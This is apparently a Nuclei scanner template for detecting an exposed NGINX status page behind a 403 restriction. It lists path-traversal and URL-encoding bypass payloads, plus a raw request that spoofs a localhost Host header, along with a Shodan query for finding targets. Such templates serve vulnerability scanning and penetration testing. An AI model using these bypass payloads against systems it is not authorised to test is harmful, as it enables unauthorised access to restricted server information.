flow: http(1) && (http(2) || http (3))
http:
- matchers:
  - dsl:
    - status_code == 403
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/nginx_status'
- attack: clusterbomb
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "Active connections:")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}{{paths}}'
  payloads:
    paths:
    - /../nginx_status
    - /./nginx_status
    - /.//nginx_status
    - /./..;/nginx_status
    - /%2e%2e/nginx_status
    - /./%252e%252e/nginx_status
    - /./%6e%67%69%6e%78_%73%74%61%74%75%73
    - /;/nginx_status
    - /./?/nginx_status
    - /./nginx_status;
    - /./nginx_status%20
    - /./nginx_status/
  stop-at-first-match: true
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "Active connections:")
    type: dsl
  raw:
  - '@Host: localhost

    GET /nginx_status HTTP/1.1

    Host: localhost

    '
id: nginx-status-403-bypass
info:
  author: pussycat0x
  description: 'Detected an NGINX status disclosure and a 403 bypass that allowed
    unauthorized access to the /nginx_status endpoint.

    '
  metadata:
    shodan-query: server:nginx
    verified: true
  name: Nginx Status Page - 403 Bypass
  reference:
  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
  severity: low
  tags: nginx,status,disclosure,bypass,misconfig
